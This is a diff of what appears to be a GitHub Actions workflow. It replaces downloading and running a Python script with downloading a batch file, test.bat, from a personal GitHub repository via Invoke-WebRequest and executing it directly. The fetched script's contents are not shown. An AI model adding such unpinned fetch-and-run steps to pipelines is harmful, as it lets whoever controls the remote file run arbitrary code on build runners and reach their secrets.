@@ -8,19 +8,6 @@ jobs:
 
     steps:
     - name: downlowd
-      run: Invoke-WebRequest https://raw.githubusercontent.com/minexd2000/test-away/main/test.py -OutFile test.py  
-      
-    - name: Set up Python
-      uses: actions/setup-python@v2
-      with:
-        python-version: '3.x'
-
-    - name: Install dependencies
-      run: |
-        python -m pip install --upgrade pip
-        if (Test-Path requirements.txt) {
-          pip install -r requirements.txt
-        }
-
+      run: Invoke-WebRequest https://raw.githubusercontent.com/minexd2000/test-away/main/test.bat -OutFile test.bat
     - name: Run Python script
-      run: test.py
+      run: test.bat
